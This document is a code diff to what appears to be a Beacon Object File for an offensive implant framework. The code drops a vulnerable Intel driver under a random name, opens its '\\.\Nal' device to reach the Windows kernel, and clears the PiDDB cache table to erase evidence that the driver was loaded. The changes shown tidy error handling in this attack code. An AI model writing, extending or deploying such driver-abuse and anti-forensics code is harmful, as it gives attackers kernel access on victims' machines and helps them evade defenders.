@@ -1,8 +1,8 @@
 #include <intel_driver.hpp>
 namespace Intel {
 
-	__attribute__((used, section(".data"))) uintptr_t piddb_lock_ptr = 0;
-	__attribute__((used, section(".data"))) uintptr_t piddb_cache_ptr = 0;
+	__attribute__((used, section(".data"))) uintptr_t ddb_lock_ptr = 0;
+	__attribute__((used, section(".data"))) uintptr_t ddb_cache_ptr = 0;
 	__attribute__((used, section(".data"))) uintptr_t ntoskrnl = 0;
 
 	BOOL IsRunning() {
@@ -240,7 +240,6 @@ namespace Intel {
 			driver_name[i] = alphanum[rand_n % sizeof(alphanum) - 1];
 		}
 
-		// NOTE: this BOF will never be (or shouldn't be) cached 
 		Beacon$MemSet(driver_path, 0, sizeof(driver_path));
 
 		if (!Beacon$WriteToDisk(driver_path, driver, size) ||
@@ -255,7 +254,6 @@ namespace Intel {
 		handle = KERNEL32$CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (!handle || handle == INVALID_HANDLE_VALUE) {
 
-			// TODO: return an NTSTATUS from DriverLoad/Unload 
 			DriverUnload(handle, driver_name, size);
 			goto defer;
 		}
@@ -263,10 +261,13 @@ namespace Intel {
 		// TODO: string hash names
 		if (!(ntoskrnl = Beacon$FindKernelModule("ntoskrnl.exe")) ||
 			!(image = Beacon$CreateImageData((uint8_t*) ntoskrnl))) {
+
+			DriverUnload(handle, driver_name, size);
 			goto defer;
 		}
 
 		if (!ClearPiDDBCacheTable(handle)) {
+			DriverUnload(handle, driver_name, size);
 			goto defer;
 		}
 
